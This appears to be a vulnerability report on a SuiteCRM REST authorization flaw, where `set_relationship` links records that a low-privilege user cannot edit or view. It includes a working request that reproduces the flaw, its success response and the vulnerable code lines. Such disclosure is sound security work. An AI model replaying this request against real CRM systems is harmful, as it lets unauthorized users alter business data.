# VULN-078 — Legacy `set_relationship`: relate/detach arbitrary records with only view on the primary (BOLA)

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Medium (CVSS 3.1 5.4 — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: see `run.log`

## Preconditions
- Low-priv user `mod_ea62f9a5` (id `220c800d-3ab1-4551-93da-8139709867b2`), Role
  `6443fb97-8a84-46c9-86b9-eb79486d84bd` denying `Accounts` `edit` (view stays default-ALL) AND
  `Contacts` `view`+`edit` both (zero access to the related module at all).
- Primary Account `b8ce128d-189a-4eae-bb08-c7f64db937a0` and related Contact
  `13aa69e8-5ae7-400b-a50f-6be60f3f4302`, both admin-owned.

## Request
Controls (over the low-priv session):
```
method=set_entry (edit Accounts/<id>)          -> Access Denied
method=get_entry  (read Contacts/<id>)         -> Access Denied
```
Decisive request (`request.http`):
```
POST /service/v4_1/rest.php
method=set_relationship&input_type=JSON&response_type=JSON&rest_data=
  ["<low-priv session>","Accounts","b8ce128d-189a-4eae-bb08-c7f64db937a0","contacts",
   ["13aa69e8-5ae7-400b-a50f-6be60f3f4302"]]
```

## Response
Controls: both `{"name":"Access Denied","number":40,"description":"You do not have access"}`.
Decisive (`response.txt`): `{"created":1,"failed":0,"deleted":0}` — reported success.
DB (`accounts_contacts`): a real row `{"account_id":"b8ce128d-...","contact_id":"13aa69e8-...","deleted":"0"}`.

## Observation
Matches the static finding exactly: `new_handle_set_relationship()`
(`service/core/SoapHelperWebService.php:816-864`) gates only `$mod->ACLAccess('DetailView')` on
the **primary** (`:832`) — never `edit`, and never anything on `$related_ids` before
`->add($related_ids, $name_value_pair)` (`:852`). Live evidence: the exact same low-priv session
that was correctly denied both a direct edit of the Account and a direct read of the Contact
nonetheless successfully created a real `accounts_contacts` relationship row between them.

## Side effects
1 throwaway low-priv user, 1 throwaway Role, 1 Account, 1 Contact, 1 `accounts_contacts`
relationship row — all random-suffixed/attributable. No destructive changes.

## Research & references
CWE-639 (IDOR) / CWE-285 (Improper Authorization). OWASP WSTG-ATHZ-04:
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
